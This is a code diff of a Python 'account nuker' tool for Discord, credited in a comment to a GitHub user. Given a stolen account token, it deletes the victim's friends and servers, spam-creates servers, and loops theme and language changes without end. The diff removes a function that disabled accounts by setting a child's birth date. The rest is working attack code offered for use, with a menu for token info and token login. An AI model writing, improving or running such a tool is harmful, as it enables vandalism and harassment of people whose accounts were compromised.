@@ -1,9 +1,5 @@
-import threading
-import requests
-import discord
-import random
-import time
-import os
+# Account nuker fixed by https://github.com/iiLeafy
+import threading, requests, discord, random, time, os
 
 from colorama import Fore, init
 from selenium import webdriver
@@ -73,31 +69,36 @@ def tokenInfo(token):
 
 def tokenFuck(token):
     headers = {'Authorization': token}
+    gdel = input('Would you like to delete all guilds on this account. y/n [No Capitals] > ')
+    fdel = input('Would you like to remove all friends on this account. y/n [No Capitals] > ')
+    gcreate = input('Would you like to spam create guilds on this account.  y/n [No Capitals] > ')
+    dlmode = input('Would you like to spam change through light and dark mode. y/n [No Capitals] > ')
+    langspam = input('Would you like to spam change the user\'s language. y/n [No Capitals] > ')
     print(f"[{Fore.RED}+{Fore.RESET}] Nuking...")
 
-    for guild in guildsIds:
-        requests.delete(f'https://discord.com/api/v6/users/@me/guilds/{guild}', headers=headers)
+    if fdel == 'y':
+        for friend in friendsIds:
+            requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
 
-    for friend in friendsIds:
-        requests.delete(f'https://discord.com/api/v6/users/@me/relationships/{friend}', headers=headers)
+    if gdel == 'y':
+        for guild in guildsIds:
+            requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
 
-    for i in range(50):
-        payload = {'name': f'JAJAJA {i}', 'region': 'europe', 'icon': None, 'channels': None}
-        requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
+    if gcreate == 'y':
+        gname = input('What would you like the spammed server name be. > ')
+        gserv = input('How many servers would you like to be made. [max is 100 by discord]')
+        for i in range(int(gserv)):
+            payload = {'name': f'{gname}', 'region': 'europe', 'icon': None, 'channels': None}
+            requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
+            print(f'Server {gname} made. Count: {i}')
 
-    modes = cycle(["light", "dark"])
-    while True:
-        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
-        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)
+    if dlmode == 'y':
+        modes = cycle(["light", "dark"])
 
-def tokenDisable(token):
-    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token}, json={'date_of_birth': '2015-7-16'})
-    if r.status_code == 400:
-        print(f'[{Fore.RED}+{Fore.RESET}] Account disabled successfully')
-        input("Press any key to exit...")
-    else:
-        print(f'[{Fore.RED}-{Fore.RESET}] Invalid token')
-        input("Press any key to exit...")
+    if langspam == 'y':
+        while True:
+            setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])}
+            requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
 
 def getBanner():
     banner = f'''
@@ -112,10 +113,9 @@ def getBanner():
                 ░   ░        ░  ░    ░   ░        ░  ░    ░   ░        ░  ░       + Token info added
                                                                                   + Token login added ({Fore.RED}needs chromedriver.exe{Fore.RESET})
         
-                [{Fore.RED}1{Fore.RESET}] Disable the account 
-                [{Fore.RED}2{Fore.RESET}] Token fuck the account
-                [{Fore.RED}3{Fore.RESET}] Grab info about the account
-                [{Fore.RED}4{Fore.RESET}] Log into a token
+                [{Fore.RED}1{Fore.RESET}] Token fuck the account
+                [{Fore.RED}2{Fore.RESET}] Grab info about the account
+                [{Fore.RED}3{Fore.RESET}] Log into a token
 
     '''.replace('░', f'{Fore.RED}░{Fore.RESET}')
     return banner
@@ -123,11 +123,8 @@ def getBanner():
 def startMenu():
     print(getBanner())
     print(f'[{Fore.RED}>{Fore.RESET}] Your choice', end=''); choice = str(input('  :  '))
-    if choice == '1':
-        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
-        tokenDisable(token)
 
-    elif choice == '2':
+    if choice == '1':
         print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
         print(f'[{Fore.RED}>{Fore.RESET}] Threads amount (number)', end=''); threads = input('  :  ')
         Login().run(token)
@@ -135,11 +132,11 @@ def startMenu():
             t = threading.Thread(target=tokenFuck, args=(token, ))
             t.start()
 
-    elif choice == '3':
+    elif choice == '2':
         print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
         tokenInfo(token)
     
-    elif choice == '4':
+    elif choice == '3':
         print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
         tokenLogin(token)
 
